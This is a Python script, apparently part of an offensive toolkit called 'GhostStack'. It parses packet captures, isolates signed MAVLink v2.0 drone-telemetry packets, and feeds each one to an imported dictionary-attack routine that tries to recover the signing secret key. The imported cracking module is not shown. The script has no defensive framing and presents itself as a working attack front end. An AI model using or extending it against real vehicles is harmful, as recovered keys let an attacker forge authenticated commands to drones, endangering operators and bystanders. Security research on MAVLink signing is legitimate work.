from scapy.all import rdpcap, UDP
import sys

# GhostStack: Network Layer - PCAP Parser for MAVLink
#
# Automatically ingests a .pcap file, isolates MAVLink v2.0 packets,
# extracts the signature, and passes it to the dictionary attacker.

def extract_mavlink_packets(pcap_file):
    print(f"[*] Reading PCAP file: {pcap_file}")
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[-] Error reading PCAP: {e}")
        return []

    mavlink_packets = []
    for pkt in packets:
        if pkt.haslayer(UDP):
            raw_payload = bytes(pkt[UDP].payload)
            # MAVLink v2.0 STX is 0xFD
            if len(raw_payload) > 12 and raw_payload[0] == 0xFD:
                # Check incompatibility flag for signature
                if raw_payload[2] & 0x01:
                    mavlink_packets.append(raw_payload)
                    
    print(f"[+] Found {len(mavlink_packets)} signed MAVLink v2.0 packets.")
    return mavlink_packets

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 pcap_parser.py <capture.pcap> <dictionary.txt>")
        sys.exit(1)

    pcap_path = sys.argv[1]
    dict_path = sys.argv[2]
    
    # Lazy import to avoid circular dependencies if integrated later
    import dictionary_attack
    
    packets = extract_mavlink_packets(pcap_path)
    for i, pkt in enumerate(packets):
        print(f"\n[*] Analyzing Packet {i+1}/{len(packets)}")
        result = dictionary_attack.crack_signature(pkt, dict_path)
        if result:
            print(f"[!] Vulnerability Found! Secret Key: {result}")
            break
